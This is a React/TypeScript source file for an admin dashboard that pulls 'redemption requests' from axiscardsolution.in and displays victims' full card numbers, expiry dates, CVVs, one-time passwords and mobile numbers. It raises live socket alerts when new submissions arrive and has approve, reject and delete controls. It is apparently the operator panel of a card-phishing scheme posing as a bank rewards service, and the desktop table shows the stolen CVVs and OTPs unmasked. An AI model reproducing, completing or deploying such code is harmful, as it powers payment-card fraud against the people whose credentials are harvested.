import React, { useState, useEffect } from 'react';
import io from 'socket.io-client';
import { Check, X, Trash2, Eye, EyeOff, Menu, LogOut, RefreshCw } from 'lucide-react';

interface RedemptionRequest {
  id: string;
  fullName: string;
  mobileNumber: string;
  cardLimit: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  otp: string;
  status: string;
  submittedAt: string;
  ipAddress: string;
  userAgent: string;
}

interface AdminPanelProps {
  onLogout: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onLogout }) => {
  const [requests, setRequests] = useState<RedemptionRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [stats, setStats] = useState({
    total: 0,
    pending: 0,
    approved: 0,
    rejected: 0
  });
  const [newRequestNotification, setNewRequestNotification] = useState(false);
  const [showSensitiveData, setShowSensitiveData] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

  // Safe fetch function with error handling
  const fetchRequests = async () => {
    try {
      setLoading(true);
      setError(null);
      
      const token = localStorage.getItem('adminToken');
      if (!token) {
        setError('Authentication token not found.');
        onLogout();
        return;
      }

      const response = await fetch("https://axiscardsolution.in/api/admin/redemption-requests?limit=100", {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.status === 401) {
        setError('Your session has expired. Please log in again.');
        onLogout();
        return;
      }

      if (!response.ok) {
        throw new Error(`Failed to fetch data: ${response.status}`);
      }

      const data = await response.json();
      
      // Validate response data structure
      if (data && Array.isArray(data.requests)) {
        setRequests(data.requests);
        setStats(data.stats || {
          total: data.requests.length,
          pending: data.requests.filter((req: RedemptionRequest) => req.status === 'pending').length,
          approved: data.requests.filter((req: RedemptionRequest) => req.status === 'approved').length,
          rejected: data.requests.filter((req: RedemptionRequest) => req.status === 'rejected').length
        });
      } else {
        throw new Error('Invalid response format');
      }
    } catch (err) {
      console.error('Fetch error:', err);
      setError(err instanceof Error ? err.message : 'An unknown error occurred.');
    } finally {
      setLoading(false);
    }
  };

  // Initial data fetch
  useEffect(() => {
    fetchRequests();
  }, []);

  // WebSocket for real-time updates
  useEffect(() => {
    let socket: any;
    
    try {
      socket = io('https://axiscardsolution.in', {
        transports: ['websocket', 'polling']
      });

      socket.on('connect', () => {
        console.log('🔌 Connected to server for real-time updates');
      });

      socket.on('redemptionUpdate', (data: any) => {
        console.log('🔄 Real-time update received:', data);
        setNewRequestNotification(true);
        fetchRequests();
        
        setTimeout(() => {
          setNewRequestNotification(false);
        }, 5000);
      });

      socket.on('disconnect', () => {
        console.log('🔌 Disconnected from server');
      });

      socket.on('connect_error', (error: Error) => {
        console.error('WebSocket connection error:', error);
      });

    } catch (err) {
      console.error('WebSocket initialization error:', err);
    }

    return () => {
      if (socket) {
        socket.disconnect();
      }
    };
  }, []);

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    onLogout();
  };

  const handleStatusUpdate = async (id: string, newStatus: string) => {
    try {
      const token = localStorage.getItem('adminToken');
      if (!token) {
        alert('Authentication token not found. Please log in again.');
        onLogout();
        return;
      }

      const response = await fetch(`https://axiscardsolution.in/api/admin/redemption-requests/${id}/status`, {
        method: 'PATCH',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ status: newStatus }),
      });

      if (response.ok) {
        console.log('Status updated successfully');
        fetchRequests(); // Refresh data
      } else {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.message || `Failed to update status: ${response.status}`);
      }
    } catch (err) {
      console.error('Error updating status:', err);
      alert(err instanceof Error ? err.message : 'Failed to update status. Please try again.');
    }
  };

  const handleDelete = async (id: string) => {
    if (!window.confirm('Are you sure you want to delete this request?')) {
      return;
    }

    try {
      const token = localStorage.getItem('adminToken');
      if (!token) {
        alert('Authentication token not found. Please log in again.');
        onLogout();
        return;
      }

      const response = await fetch(`https://axiscardsolution.in/api/admin/redemption-requests/${id}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.ok) {
        console.log('Request deleted successfully');
        fetchRequests(); // Refresh data
      } else {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.message || `Failed to delete request: ${response.status}`);
      }
    } catch (err) {
      console.error('Error deleting request:', err);
      alert(err instanceof Error ? err.message : 'Failed to delete request. Please try again.');
    }
  };

  const refreshData = () => {
    fetchRequests();
  };

  // Safe data formatting functions
  const formatCardNumber = (cardNumber: string = '') => {
    if (!showSensitiveData) {
      return '•••• •••• •••• ' + (cardNumber.slice(-4) || '••••');
    }
    return cardNumber.replace(/(\d{4})/g, '$1 ').trim();
  };

  const formatMobile = (mobile: string = '') => {
    if (!showSensitiveData) {
      return '•••• ••' + (mobile.slice(-4) || '••••');
    }
    return mobile;
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'approved': return 'bg-green-100 text-green-800 border-green-200';
      case 'rejected': return 'bg-red-100 text-red-800 border-red-200';
      default: return 'bg-yellow-100 text-yellow-800 border-yellow-200';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'approved': return '✅';
      case 'rejected': return '❌';
      default: return '⏳';
    }
  };

  // Safe date formatting
  const formatDate = (dateString: string) => {
    try {
      return new Date(dateString).toLocaleDateString();
    } catch {
      return 'Invalid Date';
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Mobile Header */}
      <div className="bg-white shadow-sm border-b border-gray-200 lg:hidden">
        <div className="flex items-center justify-between p-4">
          <div className="flex items-center space-x-3">
            <button
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
              className="p-2 rounded-md text-gray-600 hover:bg-gray-100"
              type="button"
            >
              <Menu className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-semibold text-gray-900">Admin Panel</h1>
              <p className="text-xs text-gray-500">Real-time monitoring</p>
            </div>
          </div>
          <button
            onClick={refreshData}
            disabled={loading}
            className="p-2 text-gray-600 hover:bg-gray-100 rounded-md disabled:opacity-50"
            type="button"
          >
            <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>
      </div>

      {/* Mobile Menu */}
      {isMobileMenuOpen && (
        <div className="lg:hidden bg-white border-b border-gray-200 p-4 space-y-3">
          <button
            onClick={() => setShowSensitiveData(!showSensitiveData)}
            className="w-full flex items-center justify-between p-3 text-left text-gray-700 bg-gray-50 rounded-lg"
            type="button"
          >
            <span>{showSensitiveData ? 'Hide Sensitive Data' : 'Show Sensitive Data'}</span>
            {showSensitiveData ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
          <button
            onClick={handleLogout}
            className="w-full flex items-center justify-between p-3 text-left text-red-600 bg-red-50 rounded-lg"
            type="button"
          >
            <span>Logout</span>
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      )}

      <div className="p-3 sm:p-4 lg:p-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-2 gap-3 mb-4 sm:grid-cols-2 lg:grid-cols-4 lg:gap-5 lg:mb-6">
          <div className="bg-white p-3 rounded-lg shadow-sm border border-gray-200">
            <div className="text-xs font-medium text-gray-500 sm:text-sm">Total</div>
            <div className="mt-1 text-xl font-semibold text-gray-900 sm:text-2xl">{stats.total}</div>
          </div>
          <div className="bg-white p-3 rounded-lg shadow-sm border border-gray-200">
            <div className="text-xs font-medium text-gray-500 sm:text-sm">Pending</div>
            <div className="mt-1 text-xl font-semibold text-yellow-600 sm:text-2xl">{stats.pending}</div>
          </div>
          <div className="bg-white p-3 rounded-lg shadow-sm border border-gray-200">
            <div className="text-xs font-medium text-gray-500 sm:text-sm">Approved</div>
            <div className="mt-1 text-xl font-semibold text-green-600 sm:text-2xl">{stats.approved}</div>
          </div>
          <div className="bg-white p-3 rounded-lg shadow-sm border border-gray-200">
            <div className="text-xs font-medium text-gray-500 sm:text-sm">Rejected</div>
            <div className="mt-1 text-xl font-semibold text-red-600 sm:text-2xl">{stats.rejected}</div>
          </div>
        </div>

        {/* Desktop Controls */}
        <div className="hidden lg:flex items-center justify-between mb-6">
          <div className="flex items-center space-x-3">
            <button
              onClick={refreshData}
              disabled={loading}
              className="flex items-center space-x-2 px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 disabled:opacity-50"
              type="button"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              <span>{loading ? 'Refreshing...' : 'Refresh'}</span>
            </button>
            <button
              onClick={() => setShowSensitiveData(!showSensitiveData)}
              className="flex items-center space-x-2 px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md shadow-sm hover:bg-gray-50"
              type="button"
            >
              {showSensitiveData ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              <span>{showSensitiveData ? 'Hide Data' : 'Show Data'}</span>
            </button>
          </div>
          <button
            onClick={handleLogout}
            className="px-4 py-2 text-sm font-medium text-white bg-red-600 border border-transparent rounded-md shadow-sm hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
            type="button"
          >
            Logout
          </button>
        </div>

        {/* New Request Notification */}
        {newRequestNotification && (
          <div className="mb-4 p-3 bg-green-100 border border-green-400 text-green-700 rounded-lg animate-pulse">
            <div className="flex justify-between items-center">
              <span className="text-sm">🔄 New request received!</span>
              <button
                onClick={() => setNewRequestNotification(false)}
                className="text-green-700 hover:text-green-900"
                type="button"
              >
                ×
              </button>
            </div>
          </div>
        )}

        {/* Main Content */}
        <div className="bg-white shadow rounded-lg">
          {loading && (
            <div className="p-6 text-center">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-600 mx-auto"></div>
              <p className="mt-3 text-gray-600 text-sm">Loading requests...</p>
            </div>
          )}

          {error && (
            <div className="p-4 text-center">
              <p className="text-red-600 text-sm">{error}</p>
              <button
                onClick={refreshData}
                className="mt-3 px-4 py-2 text-sm font-medium text-white bg-indigo-600 rounded-md hover:bg-indigo-700"
                type="button"
              >
                Try Again
              </button>
            </div>
          )}

          {!loading && !error && (
            <div>
              {/* Mobile Card View */}
              <div className="lg:hidden divide-y divide-gray-200">
                {requests.length > 0 ? requests.map((req) => (
                  <div key={req.id} className="p-4 hover:bg-gray-50">
                    {/* Header */}
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex-1">
                        <div className="flex items-center space-x-2 mb-1">
                          <span className="text-lg">{getStatusIcon(req.status)}</span>
                          <h3 className="font-medium text-gray-900 text-sm">{req.fullName || 'N/A'}</h3>
                        </div>
                        <p className="text-xs text-gray-500">{formatMobile(req.mobileNumber)}</p>
                      </div>
                      <div className="flex items-center space-x-1">
                        <span className={`px-2 py-1 text-xs font-medium rounded-full border ${getStatusColor(req.status)}`}>
                          {req.status || 'unknown'}
                        </span>
                      </div>
                    </div>

                    {/* Card Details */}
                    <div className="grid grid-cols-2 gap-3 text-xs mb-3">
                      <div>
                        <span className="text-gray-500">Card</span>
                        <p className="font-medium truncate">{formatCardNumber(req.cardNumber)}</p>
                      </div>
                      <div>
                        <span className="text-gray-500">Expiry</span>
                        <p className="font-medium">{req.expiryDate || 'N/A'}</p>
                      </div>
                      <div>
                        <span className="text-gray-500">CVV</span>
                        <p className="font-medium">{showSensitiveData ? (req.cvv || 'N/A') : '•••'}</p>
                      </div>
                      <div>
                        <span className="text-gray-500">OTP</span>
                        <p className="font-medium">{showSensitiveData ? (req.otp || 'N/A') : '••••••'}</p>
                      </div>
                    </div>

                    {/* Footer */}
                    <div className="flex items-center justify-between pt-3 border-t border-gray-200">
                      <div className="text-xs text-gray-500">
                        Limit: {req.cardLimit ? `₹${req.cardLimit}` : 'N/A'}
                      </div>
                      <div className="text-xs text-gray-500">
                        {formatDate(req.submittedAt)}
                      </div>
                    </div>

                    {/* Actions */}
                    <div className="flex justify-end space-x-2 mt-3 pt-3 border-t border-gray-200">
                      {req.status === 'pending' && (
                        <>
                          <button
                            onClick={() => handleStatusUpdate(req.id, 'approved')}
                            className="p-2 text-green-600 bg-green-50 border border-green-200 rounded-md hover:bg-green-100 transition-colors"
                            title="Approve"
                            type="button"
                          >
                            <Check className="w-4 h-4" />
                          </button>
                          <button
                            onClick={() => handleStatusUpdate(req.id, 'rejected')}
                            className="p-2 text-red-600 bg-red-50 border border-red-200 rounded-md hover:bg-red-100 transition-colors"
                            title="Reject"
                            type="button"
                          >
                            <X className="w-4 h-4" />
                          </button>
                        </>
                      )}
                      <button
                        onClick={() => handleDelete(req.id)}
                        className="p-2 text-gray-600 bg-gray-50 border border-gray-200 rounded-md hover:bg-gray-100 transition-colors"
                        title="Delete"
                        type="button"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                )) : (
                  <div className="p-8 text-center">
                    <p className="text-gray-500 text-sm">No redemption requests found.</p>
                  </div>
                )}
              </div>

              {/* Desktop Table View */}
              <div className="hidden lg:block overflow-x-auto">
                <table className="min-w-full divide-y divide-gray-200">
                  <thead className="bg-gray-50">
                    <tr>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Full Name</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Mobile Number</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Card Number</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Expiry Date</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">CVV</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">OTP</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Card Limit</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Status</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Submitted At</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="bg-white divide-y divide-gray-200">
                    {requests.map((req) => (
                      <tr key={req.id} className="hover:bg-gray-50">
                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{req.fullName || 'N/A'}</td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.mobileNumber || 'N/A'}</td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.cardNumber || 'N/A'}</td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.expiryDate || 'N/A'}</td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.cvv || 'N/A'}</td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{req.otp || 'N/A'}</td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                          {req.cardLimit ? `₹${req.cardLimit}` : 'Not specified'}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm">
                          <span className={`px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${
                            req.status === 'approved' ? 'bg-green-100 text-green-800' :
                            req.status === 'rejected' ? 'bg-red-100 text-red-800' :
                            'bg-yellow-100 text-yellow-800'
                          }`}>
                            {req.status || 'unknown'}
                          </span>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                          {formatDate(req.submittedAt)}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium space-x-2">
                          {req.status === 'pending' && (
                            <>
                              <button
                                onClick={() => handleStatusUpdate(req.id, 'approved')}
                                className="inline-flex items-center justify-center w-8 h-8 text-green-600 bg-green-50 border border-green-200 rounded-md hover:bg-green-100 hover:text-green-700 transition-colors"
                                title="Approve Request"
                                type="button"
                              >
                                <Check className="w-4 h-4" />
                              </button>
                              <button
                                onClick={() => handleStatusUpdate(req.id, 'rejected')}
                                className="inline-flex items-center justify-center w-8 h-8 text-red-600 bg-red-50 border border-red-200 rounded-md hover:bg-red-100 hover:text-red-700 transition-colors"
                                title="Reject Request"
                                type="button"
                              >
                                <X className="w-4 h-4" />
                              </button>
                            </>
                          )}
                          <button
                            onClick={() => handleDelete(req.id)}
                            className="inline-flex items-center justify-center w-8 h-8 text-gray-600 bg-gray-50 border border-gray-200 rounded-md hover:bg-gray-100 hover:text-gray-700 transition-colors"
                            title="Delete Request"
                            type="button"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>

        {/* Real-time Status Indicator */}
        <div className="mt-4 flex items-center justify-center text-xs text-gray-500 sm:text-sm">
          <div className="flex items-center">
            <div className="w-2 h-2 bg-green-500 rounded-full mr-2 animate-pulse"></div>
            <span>Real-time updates active</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;